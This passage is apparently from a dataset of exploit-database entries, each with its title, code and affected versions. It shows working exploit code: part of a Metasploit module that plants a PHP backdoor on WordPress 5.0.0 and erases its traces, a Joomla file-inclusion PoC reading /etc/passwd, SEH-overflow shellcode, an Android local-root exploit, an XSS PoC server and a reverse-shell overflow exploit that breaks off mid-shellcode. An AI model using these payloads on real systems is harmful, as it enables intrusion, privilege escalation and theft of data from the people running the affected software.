62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38       39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73       74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4       A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4       D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF       C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06       07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00       01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09       23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37       38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A       73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2       A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2       D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF       DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B       3F 3E     ]     img_data = [img_data.join].pack('H*')     img_name += '.jpg'      boundary = ""#{rand_text_alphanumeric(rand(10) + 5)}""     post_data = ""--#{boundary}\r\n""     post_data << ""Content-Disposition: form-data; name=\""name\""\r\n""     post_data << ""\r\n#{img_name}\r\n""     post_data << ""--#{boundary}\r\n""     post_data << ""Content-Disposition: form-data; name=\""action\""\r\n""     post_data << ""\r\nupload-attachment\r\n""     post_data << ""--#{boundary}\r\n""     post_data << ""Content-Disposition: form-data; name=\""_wpnonce\""\r\n""     post_data << ""\r\n#{wp_nonce}\r\n""     post_data << ""--#{boundary}\r\n""     post_data << ""Content-Disposition: form-data; name=\""async-upload\""; filename=\""#{img_name}\""\r\n""     post_data << ""Content-Type: image/jpeg\r\n""     post_data << ""\r\n#{img_data}\r\n""     post_data << ""--#{boundary}--\r\n""     print_status(""Uploading payload"")     upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')      res = send_request_cgi(       'method'   => 'POST',       'uri'      => upload_uri,       'ctype'    => ""multipart/form-data; boundary=#{boundary}"",       'data'     => post_data,       'cookie'   => cookie     )     fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res && res.code == 200 && res.body && !res.body.empty?     print_good(""Image uploaded"")     res = JSON.parse(res.body)     image_id = res[""data""][""id""]     update_nonce = res[""data""][""nonces""][""update""]     filename = res[""data""][""filename""]     return filename, image_id, update_nonce   end    def image_editor(img_name, ajax_nonce, image_id, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'    => 'POST',       'uri'       => uri,       'cookie' => cookie,       'vars_post'  => {         'action' => 'image-editor',         '_ajax_nonce' => ajax_nonce,         'postid' => image_id,         'history' => '[{""c"":{""x"":0,""y"":0,""w"":400,""h"":300}}]',         'target' => 'all',         'context' => '',         'do' => 'save'       }     )     fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res && res.code == 200 && res.body && !res.body.empty?     filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first     fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename      filename << '.jpg'   end    def change_path(wpnonce2, image_id, filename, current_date, path, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie,       'vars_post'  => {         '_wpnonce' => wpnonce2,         'action' => 'editpost',         'post_ID' => image_id,         'meta_input[_wp_attached_file]' => ""#{current_date}#{filename}#{path}""       }     )   end    def crop_image(image_id, ajax_nonce, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie,       'vars_post'  => {         'action' => 'crop-image',         '_ajax_nonce' => ajax_nonce,         'id' => image_id,         'cropDetails[x1]' => 0,         'cropDetails[y1]' => 0,         'cropDetails[width]' => 400,         'cropDetails[height]' => 300,         'cropDetails[dst_width]' => 400,         'cropDetails[dst_height]' => 300       }     )   end    def include_theme(shell_name, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php')     res = send_request_cgi(       'method'   => 'POST',       'uri'      => uri,       'cookie' => cookie     )     if res && res.code == 200 && res.body && !res.body.empty?       wpnonce2 = res.body.scan(/name=""_wpnonce"" value=""(\w+)""/).flatten.first       post_id = res.body.scan(/""post"":{""id"":(\w+),/).flatten.first       fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 && post_id        post_title = Rex::Text.rand_text_alpha(10)       uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')       res = send_request_cgi(         'method'   => 'POST',         'uri'      => uri,         'cookie' => cookie,         'vars_post'  => {           '_wpnonce'=> wpnonce2,           'action' => 'editpost',           'post_ID' => post_id,           'post_title' => post_title,           'post_name' => post_title,           'meta_input[_wp_page_template]' => ""cropped-#{shell_name}.jpg""         }       )       fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res && res.code == 302       post_id     end   end    def check_for_base64(cookie, post_id)     uri = normalize_uri(datastore['TARGETURI'])     # Test if base64 is on target     test_string = 'YmFzZTY0c3BvdHRlZAo='     res = send_request_cgi!(       'method'   => 'GET',       'uri'      => uri,       'cookie' => cookie,       'vars_get' => {         'p' => post_id,         '0' => ""echo #{test_string} | base64 -d""       }     )     fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res && res.code == 200 && !res.body.empty?      fail_with(Failure::NotFound, ""Can't find base64 decode on target"") unless res.body.include?(""base64spotted"")     # Execute payload with base64 decode     @backdoor = Rex::Text.rand_text_alpha(10)     encoded = Rex::Text.encode_base64(payload.encoded)     res = send_request_cgi!(       'method'   => 'GET',       'uri'      => uri,       'cookie' => cookie,       'vars_get' => {         'p' => post_id,         '0' => ""echo #{encoded} | base64 -d > #{@backdoor}.php""       }     )      fail_with(Failure::NotFound, 'Failed to send payload to target') unless res && res.code == 200 && !res.body.empty?     send_request_cgi(       'method'  =>  'GET',       'uri'     =>  normalize_uri(datastore['TARGETURI'], ""#{@backdoor}.php""),       'cookie'  =>  cookie     )   end    def wp_cleanup(shell_name, post_id, cookie)     print_status('Attempting to clean up files...')     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'    => 'POST',       'uri'       => uri,       'cookie'    => cookie,       'vars_post'  => { 'action' => ""query-attachments"" }     )      fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res && res.code == 200 && !res.body.empty?     infos = res.body.scan(/id"":(\d+),.*filename"":""cropped-#{shell_name}"".*?""delete"":""(\w+)"".*""id"":(\d+),.*filename"":""cropped-x"".*?""delete"":""(\w+)"".*""id"":(\d+),.*filename"":""#{shell_name}"".*?""delete"":""(\w+)""/).flatten     id1, id2, id3 = infos[0], infos[2], infos[4]     delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]     for i in (0...6).step(2)       res = send_request_cgi(         'method'    => 'POST',         'uri'       => uri,         'cookie'    => cookie,         'vars_post'  => {             'action' => ""delete-post"",             'id'     => infos[i],             '_wpnonce' => infos[i+1]         }       )     end      uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php')     res = send_request_cgi(       'method'    => 'GET',       'uri'       => uri1,       'cookie'    => cookie     )      if res && res.code == 200 && res.body && !res.body.empty?       post_nonce = res.body.scan(/post=#{post_id}&action=trash&_wpnonce=(\w+)/).flatten.first       fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce       uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')        res = send_request_cgi(         'method'    => 'GET',         'uri'       => uri2,         'cookie'    => cookie,         'vars_get'  => {           'post'     => post_id,           'action'   => 'trash',           '_wpnonce' => post_nonce         }       )        fail_with(Failure::NotFound, 'Unable to retrieve response') unless res && res.code == 302       res = send_request_cgi(         'method'    => 'GET',         'uri'       => uri1,         'cookie'    => cookie,         'vars_get'  => {           'post_status' => ""trash"",           'post_type'   => 'post',           '_wpnonce' => post_nonce         }       )        if res && res.code == 200 && res.body && !res.body.empty?         nonce = res.body.scan(/post=#{post_id}&action=delete&_wpnonce=(\w+)/).flatten.first         fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce          send_request_cgi(           'method'    => 'GET',           'uri'       => uri2,           'cookie'    => cookie,           'vars_get'  => {             'post'     => post_id,             'action'   => 'delete',             '_wpnonce' => nonce           }         )       end     end   end    def exploit     fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?      print_status(""Authenticating with WordPress using #{username}:#{password}..."")     cookie = wordpress_login(username, password)     fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?     print_good(""Authenticated with WordPress"")     store_valid_credential(user: username, private: password, proof: cookie)      print_status(""Preparing payload..."")     @current_theme = get_current_theme     wp_nonce = get_wpnonce(cookie)     @current_date = Time.now.strftime(""%Y/%m/"")      img_name = Rex::Text.rand_text_alpha(10)     @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie)     ajax_nonce = get_ajaxnonce(cookie)      @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)     wpnonce2 = get_wpnonce2(image_id, cookie)      change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie)     crop_image(image_id, ajax_nonce, cookie)      @shell_name = Rex::Text.rand_text_alpha(10)     change_path(wpnonce2, image_id, @filename1, @current_date, ""?/../../../../themes/#{@current_theme}/#{@shell_name}"", cookie)     crop_image(image_id, ajax_nonce, cookie)      print_status(""Including into theme"")     post_id = include_theme(@shell_name, cookie)      check_for_base64(cookie, post_id)     wp_cleanup(@shell_name, post_id, cookie)   end    def on_new_session(client)     client.shell_command_token(""rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*"")     client.shell_command_token(""rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*"")     client.shell_command_token(""rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*"")     client.shell_command_token(""rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg"")     client.shell_command_token(""rm #{@backdoor}.php"")   end end",['5.0.0'],1
22674,"M-TECH P-Synch 6.2.5 - Full Path Disclosure source: https://www.securityfocus.com/bid/7740/info  Reportedly an attacker may make a malicious HTTP request for specific P-Synch executables passing an empty URI parameter to trigger the condition. Although unconfirmed, it is likely that the request will cause P-Sync to display an error message containing the path to the executable.  This vulnerability was reported to affect P-Synch version 6.2.5 other versions may also be affected.   https://www.example.org/psynch/nph-psa.exe?lang= https://www.example.org/psynch/nph-psf.exe?lang=",['6.2.5'],1
12178,"Joomla! Component Digital Diary 1.5.0 - Local File Inclusion ===========================================================================================================     [o] Joomla Component Digital Diary Local File Inclusion Vulnerability          Software : com_diary version 1.5.0        Author   : AntiSecurity [ Vrs-hCk NoGe OoN_BoY Paman zxvf s4va ]        Contact  : public[at]antisecurity[dot]org        Home     : http://antisecurity.org/   ===========================================================================================================     [o] Exploit         http://localhost/[path]/index.php?option=com_diary&controller=[LFI]     [o] PoC         http://localhost/index.php?option=com_diary&controller=../../../../../../../../../../etc/passwd%00   ===========================================================================================================     [o] Greetz         Angela Zhang stardustmemory aJe martfella pizzyroot Genex        H312Y yooogy mousekill }^-^{ noname matthews s4va wishnusakti        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke kaka11   ===========================================================================================================     [o] April 12 2010 - GMT +07:00 Jakarta, Indonesia",['1.5.0'],1
23892,"Systrace 1.x - Local Policy Bypass // source: https://www.securityfocus.com/bid/9998/info  Systrace has been reported prone to a vulnerability that may permit an application to completely bypass a Systrace policy. The issue presents itself because Systrace does not perform sufficient sanity checks while handling a process that is being traced with ptrace.  This issue is reported to have been silently patched in Systrace version 1.5, previous versions are believed to be prone to this vulnerability.   #include <stdio.h> #include <errno.h> #include <sys/ptrace.h> #include <sys/select.h> #include <sys/time.h> #include <sys/types.h> #include <unistd.h>  int main(int argc, char *argv[]) {         int pid;         int input[2];         int output[2];         int error[2];         int ret;         fd_set readfds;          if (argc < 2) {                 printf(""usage: ./systrace_exp <target> <arg1> <arg2> ... <argn>\n"");                 exit(0);         }          ret = pipe(input);         if (ret) {                 printf(""Unable to create pipe\n"");                 exit(1);         }         ret = pipe(output);         if (ret) {                 printf(""Unable to create pipe\n"");                 exit(1);         }         ret = pipe(error);         if (ret) {                 printf(""Unable to create pipe\n"");                 exit(1);         }          pid = fork();          if (pid > 0) {                 char somechar;                 int highest;                 struct timeval time;                  time.tv_sec = 0;                 time.tv_usec = 1000;                  close(input[0]);                 close(output[1]);                 close(error[1]);                  FD_ZERO(&readfds);                 FD_SET(0, &readfds);                 FD_SET(output[0], &readfds);                 FD_SET(error[0], &readfds);                 while (1) {                         FD_SET(0, &readfds);                         FD_SET(output[0], &readfds);                         FD_SET(error[0], &readfds);                         time.tv_sec = 0;                         time.tv_usec = 1000;                         while ((select(error[0] + 1, &readfds, NULL, NULL, &time)) > 0) {                                 if (FD_ISSET(0, &readfds)) {                                         if (read(0, &somechar, 1) != 1)                                                 exit(0);                                         write(input[1], &somechar, 1);                                 }                                 if (FD_ISSET(output[0], &readfds)) {                                         if (read(output[0], &somechar, 1) != 1)                                                 exit(0);                                         write(1, &somechar, 1);                                 }                                 if (FD_ISSET(error[0], &readfds)) {                                         if (read(error[0], &somechar, 1) != 1)                                                 exit(0);                                         write(2, &somechar, 1);                                 }                                 FD_SET(0, &readfds);                                 FD_SET(output[0], &readfds);                                 FD_SET(error[0], &readfds);                                 time.tv_sec = 0;                                 time.tv_usec = 1000;                         }                          ptrace(PTRACE_SYSCALL, pid, NULL, NULL);                         if (errno == ESRCH)                                 break;                 }         } else if (pid == 0) {                 close(input[1]);                 close(output[0]);                 close(error[0]);                 close(0);                 dup(input[0]);                 close(1);                 dup(output[1]);                 close(2);                 dup(error[1]);                 ptrace(PTRACE_TRACEME, 0, NULL, NULL);                 if (argc == 2)                         execv(argv[1], NULL);                 else                         execv(argv[1], argv + 1);         } else {                 fprintf(stderr, ""Unable to fork.\n"");                 exit(1);         }          return 0; }","['1.x', '1.5']",1
26792,"PHPWebGallery 1.3.4/1.5.1 - 'picture.php' SQL Injection source: https://www.securityfocus.com/bid/15837/info    PhpWebGallery is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.    A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.   http://www.example.com/picture.php?cat=best_rated&image_id=[SQL]",['1.3.4/1.5.1'],1
22951,"Opera 7.20 - Mail Client Policy Circumvention source: https://www.securityfocus.com/bid/8254/info  The Opera M2 Mail Client is vulnerable to a policy circumvention issue that could allow information to be disclosed to a remote attacker. It is possible for an attacker to bypass the option to suppress the viewing of external embeds. This could allow the attacker to learn the IP address of a vulnerable user and to determine if an e-mail address is valid.  This vulnerability was reported to only affect Opera 7.20 Beta 1 build 2981.  <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en""> <head> <style type=""text/css""> omf|headers { background-image: url(http://www.example.com/t.png) } </style> </head> <body> { Normal mail body here } </body> </html>",['Beta 1 build 2981'],1
7582,"IntelliTamper 2.07/2.08 - '.map' Local Overwrite (SEH) #!/usr/bin/python # IntelliTamper 2.07/2.08  (MAP File) 0-day Local SEH Overwrite Exploit # Bug discovered by cN4phux <cN4phux@gmail.com> # Tested on: IntelliTamper 2.07/2.08 / win32 SP3 FR # Shellcode: Windows Execute Command (calc) <metasploit.com> # Here's the debugger output like what u see, the EIP overwritten & attempt to read from address 41414141 so the prog must be crashz . . # EAX 0015B488 ECX 00123400 EDX 00123610 # EBX 00000000 ESP 00123604 EBP 00128B78 # ESI 00000000 EDI 00123A64 EIP 41414141 #Vive les Algeriens & greatz to friend's : me (XD) Heurs, Djug , Blub , His0k4 , Knuthy , Moorish , Ilyes , #Here's the the Poc :   import sys map_theader = (((""\x23\x23\x23\x20\x53\x49\x54\x45\x4D""                  ""\x41\x50\x31\x20\x49\x4E\x54\x45\x4C""                  ""\x4C\x49\x54\x41\x4D\x50\x45\x52\x0D\x0A""))) #junk  map_iheader = ""\x46\x49\x4C\x45\x23\x23""  # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com shellcode = (((""\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5""                ""\x91\xc1\x60\x83\xeb\xfc\xe2\xf4\x39\x79\x85\x60\xc5\x91\x4a\x25""                ""\xf9\x1a\xbd\x65\xbd\x90\x2e\xeb\x8a\x89\x4a\x3f\xe5\x90\x2a\x29""                ""\x4e\xa5\x4a\x61\x2b\xa0\x01\xf9\x69\x15\x01\x14\xc2\x50\x0b\x6d""                ""\xc4\x53\x2a\x94\xfe\xc5\xe5\x64\xb0\x74\x4a\x3f\xe1\x90\x2a\x06""                ""\x4e\x9d\x8a\xeb\x9a\x8d\xc0\x8b\x4e\x8d\x4a\x61\x2e\x18\x9d\x44""                ""\xc1\x52\xf0\xa0\xa1\x1a\x81\x50\x40\x51\xb9\x6c\x4e\xd1\xcd\xeb""                ""\xb5\x8d\x6c\xeb\xad\x99\x2a\x69\x4e\x11\x71\x60\xc5\x91\x4a\x08""                ""\xf9\xce\xf0\x96\xa5\xc7\x48\x98\x46\x51\xba\x30\xad\x61\x4b\x64""                ""\x9a\xf9\x59\x9e\x4f\x9f\x96\x9f\x22\xf2\xa0\x0c\xa6\x91\xc1\x60""))); # 160 byte  header_nop = ""\x90""*327  retn = ""\x7b\x34\x12\x00""+"".html\n"" # EIP value with 4 byte fix  exploit = map_theader + map_iheader + header_nop + shellcode + retn headers = open(""0x.map"", ""w"") headers.write(exploit) headers.close()  print ""\nFile created successfully !""; print ""\n\cN4phux."";  # milw0rm.com [2008-12-28]",['2.07/2.08'],1
16098,"Android 1.x/2.x HTC Wildfire - Local Privilege Escalation /* android 1.x/2.x the real youdev feat. init local root exploit.  *  *  * Modifications to original exploit for HTC Wildfire Stage 1 soft-root (c) 2010 Martin Paul Eve  * Changes:   * -- Will not remount /system rw (NAND protection renders this pointless)  * -- Doesn't copy self, merely chmods permissions of original executable  * -- No password required for rootshell (designed to be immediately removed once su binary is in place)  *   * Revised usage instructions:  * -- Copy to /sqlite_stmt_journals/exploid and /sqlite_stmt_journals/su  * -- chmod exploid to 755  * -- Execute the binary  * -- Enable or disable a hotplug item (wifi, bluetooth etc. -- this could be done automatically by an app that packaged this exploit) -- don't worry that it segfaults  * -- Execute it again to gain rootshell  * -- Copy to device (/sqlite_stmt_journals/) + chown/chmod su to 04711  * -- Delete original exploid  * -- Use modified Superuser app with misplaced su binary  *  * Explanatory notes:  * -- This is designed to be used with a modified superuser app (not yet written) which will use the su binary in /sqlite_stmt_journals/  * -- It is important that you delete the original exploid binary because, otherwise, any application can gain root  *  * Original copyright/usage information  *  * (C) 2009/2010 by The Android Exploid Crew.  *  * Copy from sdcard to /sqlite_stmt_journals/exploid, chmod 0755 and run.  * Or use /data/local/tmp if available (thx to ioerror!) It is important to  * to use /sqlite_stmt_journals directory if available.  * Then try to invoke hotplug by clicking Settings->Wireless->{Airplane,WiFi etc}  * or use USB keys etc. This will invoke hotplug which is actually  * our exploit making /system/bin/rootshell.  * This exploit requires /etc/firmware directory, e.g. it will  * run on real devices and not inside the emulator.  * I'd like to have this exploitet by using the same blockdevice trick  * as in udev, but internal structures only allow world writable char  * devices, not block devices, so I used the firmware subsystem.  *  * !!!This is PoC code for educational purposes only!!!  * If you run it, it might crash your device and make it unusable!  * So you use it at your own risk!  *  * Thx to all the TAEC supporters.  *  */ #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <linux/netlink.h> #include <fcntl.h> #include <errno.h> #include <stdlib.h> #include <string.h> #include <string.h> #include <unistd.h> #include <sys/stat.h> #include <signal.h> #include <sys/mount.h>  void die(const char *msg) { 	perror(msg); 	exit(errno); }  void clear_hotplug() { 	int ofd = open(""/proc/sys/kernel/hotplug"", O_WRONLY|O_TRUNC); 	write(ofd, """", 1); 	close(ofd); }  void rootshell(char **env) { 	char pwd[128]; 	char *sh[] = {""/system/bin/sh"", 0};  	setuid(0); setgid(0); 	execve(*sh, sh, env); 	die(""[-] execve""); }   int main(int argc, char **argv, char **env) { 	char buf[512], path[512]; 	int ofd; 	struct sockaddr_nl snl; 	struct iovec iov = {buf, sizeof(buf)}; 	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0}; 	int sock; 	char *basedir = NULL, *logmessage;   	/* I hope there is no LD_ bug in androids rtld :) */ 	if (geteuid() == 0 && getuid() != 0) 		rootshell(env);  	if (readlink(""/proc/self/exe"", path, sizeof(path)) < 0) 		die(""[-] readlink"");  	if (geteuid() == 0) { 		clear_hotplug(); 			 		chown(path, 0, 0); 		chmod(path, 04711); 		 		chown(""/sqlite_stmt_journals/su"", 0, 0); 		chmod(""/sqlite_stmt_journals/su"", 06755);  		return 0; 	}  	printf(""[*] Android local root exploid (C) The Android Exploid Crew\n""); 	printf(""[*] Modified by Martin Paul Eve for Wildfire Stage 1 soft-root\n"");  	basedir = ""/sqlite_stmt_journals""; 	if (chdir(basedir) < 0) { 		basedir = ""/data/local/tmp""; 		if (chdir(basedir) < 0) 			basedir = strdup(getcwd(buf, sizeof(buf))); 	} 	printf(""[+] Using basedir=%s, path=%s\n"", basedir, path); 	printf(""[+] opening NETLINK_KOBJECT_UEVENT socket\n"");  	memset(&snl, 0, sizeof(snl)); 	snl.nl_pid = 1; 	snl.nl_family = AF_NETLINK;  	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0) 		die(""[-] socket"");  	close(creat(""loading"", 0666)); 	if ((ofd = creat(""hotplug"", 0644)) < 0) 		die(""[-] creat""); 	if (write(ofd, path , strlen(path)) < 0) 		die(""[-] write""); 	close(ofd); 	symlink(""/proc/sys/kernel/hotplug"", ""data""); 	snprintf(buf, sizeof(buf), ""ACTION=add%cDEVPATH=/..%s%c"" 	         ""SUBSYSTEM=firmware%c"" 	         ""FIRMWARE=../../..%s/hotplug%c"", 0, basedir, 0, 0, basedir, 0); 	printf(""[+] sending add message ...\n""); 	if (sendmsg(sock, &msg, 0) < 0) 		die(""[-] sendmsg""); 	close(sock); 	printf(""[*] Try to invoke hotplug now, clicking at the wireless\n"" 	       ""[*] settings, plugin USB key etc.\n"" 	       ""[*] You succeeded if you find /system/bin/rootshell.\n"" 	       ""[*] GUI might hang/restart meanwhile so be patient.\n""); 	return 0; }",['1.x/2.x'],1
34929,"Nessus Web UI 2.3.3 - Persistent Cross-Site Scripting Nessus Web UI 2.3.3: Stored XSS =========================================================  CVE number: CVE-2014-7280 Permalink: http://www.thesecurityfactory.be/permalink/nessus-stored-xss.html Vendor advisory: http://www.tenable.com/security/tns-2014-08  -- Info --  Nessus is a proprietary comprehensive vulnerability scanner which is developed by Tenable Network Security. Tenable Network Security estimates that it is used by over 75,000 organisations worldwide.  -- Affected version -  Web UI version 2.3.3, Build #83  -- Vulnerability details --  By setting up a malicious web server that returns a specially crafted host header, an attacker is able to execute javascript code on the machine of the person performing a vulnerability scan of the web server. No escaping on javascript code is being performed when passing the server header to the affected Web UI version via a plugin. The javascript code will be stored in the backend database, and will execute every time the target views a report that returns the server header.  -- POC --  #!/usr/bin/env python import sys from twisted.web import server, resource from twisted.internet import reactor from twisted.python import log  class Site(server.Site):     def getResourceFor(self, request):         request.setHeader('server', '<script>alert(1)</script>SomeServer')         return server.Site.getResourceFor(self, request)  class HelloResource(resource.Resource):     isLeaf = True     numberRequests = 0      def render_GET(self, request):         self.numberRequests += 1         request.setHeader(""content-type"", ""text/plain"") return ""theSecurityFactory Nessus POC""  log.startLogging(sys.stderr) reactor.listenTCP(8080, Site(HelloResource())) reactor.run()  -- Solution --  This issue has been fixed as of version 2.3.4 of the WEB UI.   -- Timeline --  2014-06-12   Release of Web UI version 2.3.3, build#83  2014-06-13        Vulnerability discovered and creation of POC  2014-06-13        Vulnerability responsibly reported to vendor  2014-06-13        Vulnerability acknowledged by vendor  2014-06-13        Release of Web UI version 2.3.4, build#85  2014-XX-XX        Advisory published in coordination with vendor  -- Credit --  Frank Lycops Frank.lycops [at] thesecurityfactory.be","['2.3.3', '2.3.3 build#83']",1
136,"Eznet 3.5.0 - Remote Stack Overflow Universal #!/usr/bin/perl -w #########C###O###R###O###M###P###U###T###E###R########### #         [Crpt]  universal eZ v3.3 < v3.5 remote exploit by kralor  [Crpt]            # #----------------------------------------------------------------------------------------# # versions tested & not vulnerables: v3.0 v3.1 v3.2			# # versions tested & vulnerables: v3.3 v3.4 v3.5			# # Cryptso.dll contains a 'static' jmp esp in eZnetwork pack from v3.3 to v3.5	# # It is a trivial exploit, jumping to esp, then at esp we jump backward to           # # finally reach the shellcode. The shellcode gives a reverse remote shell.          # # Universal shellcode coded by kralor with the PEB technic.		# ######W#W#W#.#C#O#R#O#M#P#U#T#E###R###.###N###E###T###### use IO::Socket;  	print ""\r\n\t   [Crpt] eZ v3.3 < v3.5 remote exploit by kralor [Crpt]\r\n""; 	print ""\t\twww.coromputer.net && undernet #coromputer\r\n\r\n"";  if(@ARGV<3||@ARGV>3) { 	print ""syntax: "".$0."" <victim> <your_ip> <your_port>\r\n""; 	exit; 	}  	print ""[+] Connecting to "".$ARGV[0].""\t..."";  	my $sock = IO::Socket::INET->new(Proto=>'tcp',                                PeerAddr=>$ARGV[0],                                PeerPort=>""80""); if(!$sock) { 	print ""Error\r\n""; 	exit; 	}  	print ""Done\r\n"";  # 0xffe4	jmp  esp in Cryptso.dll (v3.3 v3.4 v3.5 @ 0x1004C72B) # 0xffffedffe9	jmp  back ($ - 4'608)  $eip		= ""\x2B\xC7\x04\x10""; $jmp_back	= ""\xE9\xFF\xED\xFF\xFF""; # universal reverse remote shell using PEB, coded by kralor. $shellc0deI	= ""\xeb\x02\xeb\x0f\x66\x81\xec\x04\x08\x8b\xec\x83\xec\x50\xe8\xef"". 		  ""\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\x9e\x01\x80\x33\x95"". 		  ""\x43\xe2\xfa\x7e\xe6\xa6\x4e\x26\xa5\xf1\x1e\x96\x1e\xd5\x99\x1e"". 		  ""\xdd\x99\x1e\x54\x1e\xc9\xb1\x9d\x1e\xe5\xa5\x96\xe1\xb1\x91\xad"". 		  ""\x8b\xe0\xd9\x1e\xd5\x8d\x1e\xcd\xa9\x96\x4d\x1e\xce\xed\x96\x4d"". 		  ""\x1e\xe6\x89\x96\x65\xc3\x1e\xe6\xb1\x96\x65\xc3\x1e\xc6\xb5\x96"". 		  ""\x45\x1e\xce\x8d\xde\x1e\xa1\x0f\x96\x65\x96\xe1\xb1\x81\x1e\xa3"". 		  ""\xae\xe1\xb1\x8d\xe1\x9f\xde\xb6\x4e\xe0\x7f\xcd\xcd\xa6\x55\x56"". 		  ""\xca\xa6\x5c\xf3\x1e\x99\xca\xca\x1e\xa9\x1a\x18\x91\x92\x56\x1e"". 		  ""\x8d\x1e\x56\xae\x54\xe0\x08\x56\xa6\x4e\xfd\xec\xd0\xed\xd4\xff"". 		  ""\x9f\xff\xde\xc6\x7d\xe9\x6a\x6a\x6a\xa6\x5c\x52\xd0\x69\xe2\xe6"". 		  ""\xa7\xca\xf3\x52\xd0\x95\xa6\xa7\x1d\xd8\x97\x1e\x48\xf3\x16\x7e"". 		  ""\x91\xc4\xc4\xc6\x6a\x45\xa6\x4e\x1c\xd0\x91\xfd\xe7\xf0\xe6\xe6"". 		  ""\xff\x9f\xff\xde\xc6\x7d\xde\x6a\x6a\x6a\x1e\xc8\x91\xa6\x6a\x52"". 		  ""\xd0\x69\xc2\xc6\xd4\xc6\x52\xd0\x95\xfa\xf6\xfe\xf0\x1c\xe8\x91"". 		  ""\xf3\x52\xd0\x91\xe1\xd4\x1e\x58\xf3\x16\x7c\x91\xc4\xc6\x6a\x45"". 		  ""\xa6\x4e\xc6\xc6\xc6\xc6\xd6\xc6\xd6\xc6\x6a\x45\x1c\xd0\x31\xfd"". 		  ""\xfb\xf0\xf6\xe1\xff\x96\xff\xc6\xff\x97\x7d\x93\x6a\x6a\x6a\xa6"". 		  ""\x4e\x26\x97\x1e\x40\xf3\x1c\x8f\x96\x46\xf3\x52\x97""; $shellc0deII	= ""\xff\x85\xc0\x6a\xe0\x31\x6a\x45\xa6"". 		  ""\x4e\xfd\xf0\xe6\xe6\xd4\xff\x9f\xff\xde\xc6\x7d\x40\x6b\x6a\x6a"". 		  ""\xa6\x4e\x52\xd0\x39\xd1\x95\x95\x95\x1c\xc8\x25\x1c\xc8\x2d\x1c"". 		  